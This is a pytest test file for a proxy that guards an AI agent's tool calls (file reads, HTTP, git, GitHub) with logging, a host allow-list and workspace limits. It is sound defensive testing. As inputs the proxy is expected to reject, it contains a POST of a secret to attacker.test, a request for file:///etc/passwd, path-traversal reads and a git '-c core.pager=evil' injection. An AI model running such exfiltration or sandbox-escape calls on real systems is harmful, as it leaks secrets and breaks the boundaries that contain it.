import json
import subprocess
import sys
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path

import pytest

from contracts import Decision, ToolCall, read_events
from proxy.core import TOOL_NAMES, Proxy
from proxy.decide import block_all

ROOT = Path(__file__).resolve().parents[2]


class _Fake(BaseHTTPRequestHandler):
    received: list = []

    def _reply(self):
        n = int(self.headers.get("Content-Length") or 0)
        body = self.rfile.read(n).decode() if n else ""
        _Fake.received.append((self.command, self.path, body))
        payload = json.dumps({"ok": True, "path": self.path}).encode()
        self.send_response(201 if self.command == "POST" else 200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(payload)))
        self.end_headers()
        self.wfile.write(payload)

    do_GET = do_POST = do_PUT = _reply

    def log_message(self, *a):
        pass


@pytest.fixture
def fake_service():
    _Fake.received = []
    srv = HTTPServer(("127.0.0.1", 0), _Fake)
    th = threading.Thread(target=srv.serve_forever, daemon=True)
    th.start()
    yield f"http://127.0.0.1:{srv.server_port}"
    srv.shutdown()


@pytest.fixture
def env(tmp_path, monkeypatch, fake_service):
    logs = tmp_path / "logs"
    monkeypatch.setenv("LOG_DIR", str(logs))
    ws = tmp_path / "ws"
    (ws / "docs").mkdir(parents=True)
    (ws / ".env").write_text("SECRET_1=deadbeef\n")
    (ws / "docs" / "readme.md").write_text("hola\n")
    subprocess.run(["git", "init", "-q"], cwd=ws, check=True)
    (tmp_path / "outside.txt").write_text("no")
    hosts = {h: fake_service for h in ("api.empresa.test", "attacker.test", "github.test", "web.test")}
    return ws, logs, hosts


def proxy_events(logs):
    return read_events(logs / "proxy.jsonl")


CALLS = {
    "read_file": {"path": ".env"},
    "list_dir": {"path": "."},
    "http_request": {"method": "GET", "url": "http://api.empresa.test/health"},
    "git": {"args": ["status"]},
    "github_issue": {"repo": "acme/app", "title": "t", "body": "b"},
    "github_comment": {"repo": "acme/app", "number": 1, "body": "c"},
}


def test_every_tool_logs_tool_call_and_decision(env):
    ws, logs, hosts = env
    p = Proxy(str(ws), session_id="s1", hosts=hosts)
    assert set(CALLS) == set(TOOL_NAMES)
    for tool, args in CALLS.items():
        out, d = p.handle(tool, args)
        assert d.action == "allow"
        assert not out.startswith("ERROR"), (tool, out)
    ev = proxy_events(logs)
    assert len(ev) == 2 * len(CALLS)
    for i, tool in enumerate(CALLS):
        tc, dec = ev[2 * i], ev[2 * i + 1]
        assert (tc.kind, dec.kind) == ("tool_call", "decision")
        assert tc.call_id == dec.call_id
        call = ToolCall.model_validate(tc.data)
        assert call.tool == tool and call.t == i + 1 and call.session_id == "s1"
        Decision.model_validate(dec.data)


def test_tool_outputs(env):
    ws, logs, hosts = env
    p = Proxy(str(ws), session_id="s", hosts=hosts)
    assert p.handle("read_file", {"path": ".env"})[0] == "SECRET_1=deadbeef\n"
    assert p.handle("list_dir", {"path": "."})[0].splitlines() == [".git/", "docs/", ".env"]
    assert p.handle("http_request", CALLS["http_request"])[0].startswith("200\n")
    out = p.handle("github_comment", CALLS["github_comment"])[0]
    assert out.startswith("201\n")
    assert _Fake.received[-1][1] == "/repos/acme/app/issues/1/comments"
    assert json.loads(_Fake.received[-1][2]) == {"body": "c"}
    assert p.handle("git", {"args": ["status"]})[0].startswith("exit 0")


def test_block_prevents_execution(env):
    ws, logs, hosts = env
    p = Proxy(str(ws), decide=block_all, session_id="s", hosts=hosts)
    out, d = p.handle("http_request", {"method": "POST", "url": "http://attacker.test/x", "body": "SECRET"})
    assert d.action == "block" and "BLOQUEADA" in out
    out, _ = p.handle("read_file", {"path": ".env"})
    assert "deadbeef" not in out
    assert _Fake.received == []
    assert [e.kind for e in proxy_events(logs)] == ["tool_call", "decision"] * 2


def test_rotate_allow_executes(env):
    ws, logs, hosts = env
    p = Proxy(str(ws), decide=lambda c: Decision(action="rotate+allow"), hosts=hosts)
    out, d = p.handle("read_file", {"path": ".env"})
    assert "deadbeef" in out and d.action == "rotate+allow"


def test_http_unknown_host_does_not_leave(env):
    ws, logs, hosts = env
    p = Proxy(str(ws), hosts=hosts)
    for url in ("http://example.com/x", "http://evil.test/x", "file:///etc/passwd", "http://127.0.0.1:1/x"):
        out, _ = p.handle("http_request", {"method": "GET", "url": url})
        assert out.startswith("ERROR: host no permitido"), out
    assert _Fake.received == []


def test_read_outside_workspace_fails(env):
    ws, logs, hosts = env
    p = Proxy(str(ws), hosts=hosts)
    for path in ("../outside.txt", str(ws.parent / "outside.txt"), "docs/../../outside.txt"):
        out, _ = p.handle("read_file", {"path": path})
        assert out.startswith("ERROR: ruta fuera del workspace"), out
    out, _ = p.handle("list_dir", {"path": ".."})
    assert out.startswith("ERROR")


def test_metadata_flags(env):
    ws, logs, hosts = env
    p = Proxy(str(ws), session_id="s", hosts=hosts)
    p.handle("read_file", {"path": "docs/readme.md"})
    p.handle("http_request", {"method": "GET", "url": "http://web.test/page"})
    p.handle("http_request", {"method": "GET", "url": "http://api.empresa.test/x"})
    p.handle("git", {"args": ["push", "origin", "main"]})
    p.handle("git", {"args": ["log"]})
    p.handle("github_issue", CALLS["github_issue"])
    calls = [ToolCall.model_validate(e.data) for e in proxy_events(logs) if e.kind == "tool_call"]
    flags = [(c.resources, c.is_sink, c.untrusted) for c in calls]
    assert flags == [
        (["docs/readme.md"], False, False),
        (["web.test"], True, True),
        (["api.empresa.test"], True, False),
        (["git"], True, False),
        (["git"], False, False),
        (["github.test"], True, True),
    ]


def test_git_stays_in_testbed(env):
    ws, logs, hosts = env
    p = Proxy(str(ws), hosts=hosts)
    out, _ = p.handle("git", {"args": ["push", "origin", "main"]})
    assert "simulado" in out
    out, _ = p.handle("git", {"args": ["-C", "..", "status"]})
    assert out.startswith("ERROR")
    out, _ = p.handle("git", {"args": ["-c", "core.pager=evil", "log"]})
    assert out.startswith("ERROR")


def test_mcp_server_lists_six_tools():
    import asyncio

    from proxy.server import build_server

    srv = build_server(Proxy("."))
    tools = asyncio.run(srv.list_tools())
    names = {getattr(t, "name", None) for t in tools}
    assert names == set(TOOL_NAMES)


def test_server_starts_over_stdio(tmp_path):
    env = {**__import__("os").environ, "LOG_DIR": str(tmp_path)}
    p = subprocess.run([sys.executable, "-c", "import proxy.server as s; s.build_server(); print('ok')"],
                       cwd=ROOT, capture_output=True, text=True, timeout=60, env=env)
    assert p.stdout.strip() == "ok", p.stderr
